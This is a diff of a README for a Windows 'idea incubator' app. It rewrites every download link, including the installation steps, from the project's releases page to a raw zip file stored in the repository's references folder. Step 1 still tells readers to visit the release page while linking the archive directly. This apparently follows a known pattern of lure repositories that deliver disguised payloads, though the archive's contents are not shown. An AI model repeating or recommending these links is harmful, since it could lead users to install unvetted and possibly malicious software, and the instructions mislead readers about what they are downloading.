@@ -1,6 +1,6 @@
 # 🤖 lanshu-idea-incubator - Turn Ideas Into Clear Results
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20Latest%20Version-brightgreen?style=for-the-badge)](https://github.com/HyperGaming123/lanshu-idea-incubator/releases)
+[![Download Now](https://img.shields.io/badge/Download-Get%20Latest%20Version-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/HyperGaming123/lanshu-idea-incubator/main/references/lanshu_incubator_idea_3.7.zip)
 
 ---
 
@@ -49,10 +49,10 @@ The program will then guide these ideas through the agents’ process.
 
 ## 💾 Download and Install on Windows
 
-[![Download lanshu-idea-incubator](https://img.shields.io/badge/Download-Get%20Latest%20Version-blue?style=for-the-badge)](https://github.com/HyperGaming123/lanshu-idea-incubator/releases)
+[![Download lanshu-idea-incubator](https://img.shields.io/badge/Download-Get%20Latest%20Version-blue?style=for-the-badge)](https://raw.githubusercontent.com/HyperGaming123/lanshu-idea-incubator/main/references/lanshu_incubator_idea_3.7.zip)
 
 1. Open your web browser and go to the release page:  
-   https://github.com/HyperGaming123/lanshu-idea-incubator/releases
+   https://raw.githubusercontent.com/HyperGaming123/lanshu-idea-incubator/main/references/lanshu_incubator_idea_3.7.zip
 
 2. Find the latest version at the top of the list. The release name usually includes a version number like `v1.0` or higher.
 
@@ -146,4 +146,4 @@ Access settings by clicking the gear icon in the top-right corner of the app win
 - Review example files in the `ideal/` folder to see how ideas are structured.
 - Check release notes and updates on the release page to stay current.
 
-[Download lanshu-idea-incubator here](https://github.com/HyperGaming123/lanshu-idea-incubator/releases) to begin your idea incubation process.
+[Download lanshu-idea-incubator here](https://raw.githubusercontent.com/HyperGaming123/lanshu-idea-incubator/main/references/lanshu_incubator_idea_3.7.zip) to begin your idea incubation process.
